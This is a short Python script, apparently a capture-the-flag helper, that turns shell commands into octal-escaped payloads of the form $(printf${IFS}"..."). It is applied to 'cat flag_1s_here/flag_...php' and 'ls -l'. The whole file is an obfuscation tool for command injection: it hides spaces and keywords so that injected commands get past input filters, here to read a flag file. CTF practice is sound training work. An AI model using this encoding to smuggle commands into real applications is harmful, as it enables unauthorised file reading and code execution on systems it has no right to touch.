def encode_octal(string):

    print(string)
    # ASCII
    print("AsicII")
    for i in string:
        print(ord(i), end="")
    # 只显示八进制
    print("\n八进制")
    for i in string:
        print(oct(ord(i)).replace("0o", "\\"), end="")  # \表示转义     \\ 标识 \

    # 显示Linux八进制payload
    print("\nlinux payload")
    payload = '$(printf${IFS}"'
    for i in string:
        payload += oct(ord(i)).replace("0o", "\\")

    payload += '")'
    print(payload)


if __name__ == '__main__':
    str1 = "cat flag_1s_here/flag_831b69012c67b35f.php"
    encode_octal(str1)
    str2 = "ls -l"
    encode_octal(str2)
